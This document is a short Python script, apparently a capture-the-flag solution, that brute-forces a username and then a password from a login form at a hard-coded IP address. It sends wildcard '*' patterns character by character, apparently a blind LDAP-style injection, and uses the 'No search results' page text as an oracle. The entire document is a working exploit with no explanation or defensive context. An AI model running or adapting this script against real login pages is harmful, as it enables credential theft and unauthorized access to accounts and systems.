import requests

url = 'http://178.62.74.50:32336/login'
words = "}{ abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ#$%&\\'()+,-./:;<=>?@[\\]^_`|~"

userBrute,passBrute = '',''
reqObj = {'username': '', 'password': '*'}

print('[*] Starting username bruteforce attempt...')

bruteForcing = 1
while bruteForcing == 1:
    bruteForcing = 0
    for word in words:
        reqObj['username'] = userBrute+word+'*'
        r = requests.post(url, data=reqObj)
        if 'No search results' in r.text:
            userBrute+=word
            print(f'[+] {userBrute}')
            bruteForcing = 1
            break

print(f'[+] Username found: {userBrute}')
print(f'[*] Starting password bruteforce attempt...')

reqObj['username'], reqObj['password'] = userBrute, ''
bruteForcing = 1
while bruteForcing == 1:
    bruteForcing = 0
    for word in words:
        reqObj['password'] = passBrute+word+'*'
        r = requests.post(url, data=reqObj)
        if 'No search results' in r.text:
            passBrute+=word
            print(f'[+] {passBrute}')
            bruteForcing = 1
            break

print(f'[+] Password found: {passBrute}')
